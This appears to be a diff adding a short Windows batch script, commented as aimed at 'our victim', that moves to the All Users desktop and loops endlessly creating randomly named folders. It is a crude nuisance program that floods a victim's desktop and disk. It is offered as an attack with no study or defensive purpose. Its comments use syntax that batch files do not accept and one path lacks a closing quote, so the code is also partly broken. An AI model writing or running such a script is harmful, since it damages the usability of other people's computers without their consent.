@@ -1,0 +1,9 @@
+@echo off
+//the above line turns the printingon the screen off
+//the following changes the directory to where we want to create the random folders in oiur victim
+//it can be any location we want 
+cd "C:\documents and settings\All Users\desktop
+:folder
+//the following code generates random directories in the location we had migrated earlier
+md %random%
+goto :folder
